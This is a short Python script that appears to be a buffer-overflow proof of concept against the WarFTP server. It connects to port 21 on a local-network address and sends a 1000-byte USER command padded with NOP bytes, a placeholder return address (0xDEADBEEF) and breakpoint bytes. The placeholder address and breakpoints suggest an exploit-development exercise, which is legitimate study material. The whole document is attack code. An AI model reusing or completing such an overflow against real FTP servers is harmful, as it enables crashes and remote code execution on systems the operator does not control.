#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "\x90" * 485
buffer += "\xEF\xBE\xAD\xDE"
buffer += "\x90" * (493-len(buffer))
buffer += "\xCC" * (1000-len(buffer))
s.connect(('192.168.1.128',21))
data = s.recv(1024)
print ("Sending data to WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Finish")
